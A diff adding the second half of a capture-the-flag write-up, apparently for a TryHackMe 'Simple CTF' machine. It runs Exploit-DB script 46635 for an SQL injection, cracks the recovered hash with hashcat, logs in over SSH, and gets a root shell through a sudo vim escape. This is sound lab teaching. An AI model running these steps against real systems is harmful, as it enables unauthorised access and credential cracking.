@@ -127,5 +127,92 @@ The search result points to an Unauthenticated SQL Injection (SQLi) exploit:
 > 4. To what kind of vulnerability is the application vulnerable? s***
 
 
+After we found the CVE, let's copy the exploit file (46635.py) into our current folder using :
+
+```bash
+searchsploit -m 46635
+```
+
+Because the original script was written in Python 2, we can convert it to Python 3 using Kali's built-in 2to3 tool so it runs smoothly without syntax errors:
+
+```bash
+2to3 -w 46635.py
+```
+
+Now, let's run the script
+
+
+```bash
+python3 46635.py -u http://<TARGET_IP>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+```
+
+
+After run the script, the exploit extracts the following details from the database:
+
+<img width="407" height="87" alt="image" src="https://github.com/user-attachments/assets/70bbd833-a3b6-4db2-98f0-be8c2f1e2536" />
+
+we found the hash password but the script doenst crack hash password, it's okay. we can use ```hashcat```.
+
+```bash
+hashcat -m 20 -a 0 "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" /usr/share/wordlists/rockyou.txt
+```
+
+once Hashcat finishes, we can view the cracked password:
+
+```bash
+hashcat -m 20 "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" --show
+```
+
+
+> 5. What's the password? s*****
+
+
+# Login SSH 
+
+After we found the username and the password, we know SSH is running on the custom port 2222. Let's log in with credentials that we found:
+
+<img width="777" height="340" alt="image" src="https://github.com/user-attachments/assets/e2166f78-6a6e-4309-a8ad-9855799f382b" />
+
+now let explore a little bit to answer the question
+
+<img width="711" height="123" alt="image" src="https://github.com/user-attachments/assets/8405f924-f59e-4e56-9e9e-5a9eba7ff8c4" />
+
+> 6. What's the user flag? *******
+> 7. Is there any other user in the home directory? What's its name? ******
+
+
+# Priviledge Escalation
+
+Oftentimes we can get a root shell by abusing misconfigurations in the system. sudo is generally a good first candidate to check. We can see what rights a user has using the 
+
+```bash
+sudo -l 
+```
+
+<img width="515" height="55" alt="image" src="https://github.com/user-attachments/assets/030d78f5-2452-4517-8ba5-5730fa30aee0" />
+
+This means mitch can execute vim as root without needing a password.
+
+Vim is a text editor with many interesting features, one of which is spawning a shell. Running vim with sudo will allow us to then spawn a root shell!
+
+> 8. What can you leverage to spawn a privileged shell? ***
+
+Once inside, we can spawn a shell with the following command:
+
+```bash
+:!bash
+```
+
+<img width="436" height="67" alt="image" src="https://github.com/user-attachments/assets/faece0e8-18f7-4979-bc56-edaa4ad0c84b" />
+
+
+And then we can read the final flag by
+
+``` bash
+cat /root/root.txt
+```
+
+
+
 
 
